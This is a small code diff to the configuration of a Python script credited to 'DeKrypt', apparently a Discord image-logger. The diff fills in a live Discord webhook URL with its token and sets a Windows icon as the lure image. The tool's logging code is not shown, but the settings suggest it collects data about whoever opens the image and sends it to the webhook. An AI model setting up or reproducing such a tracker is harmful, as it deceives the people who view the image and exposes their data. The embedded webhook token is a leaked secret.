@@ -9,8 +9,8 @@ __author__ = "DeKrypt"
 
 config = {
     # 기본 설정
-    "webhook": "https://discord.com/api/webhooks/your/webhook", #웹후크 URL
-    "image": "https://link-to-your-image.here", #커스텀 이미지 URL
+    "webhook": "https://discordapp.com/api/webhooks/1351530904782114866/5VXRMvZdaFWSN7-LvZdXqov9-zeYco-nUqsBgmgCOpH6bhrRkATVtFkQWjF5kYBCk4ut", #웹후크 URL
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Icon-windows_os.svg/1200px-Icon-windows_os.svg.png", #커스텀 이미지 URL
                                                
     "imageArgument": True,
 
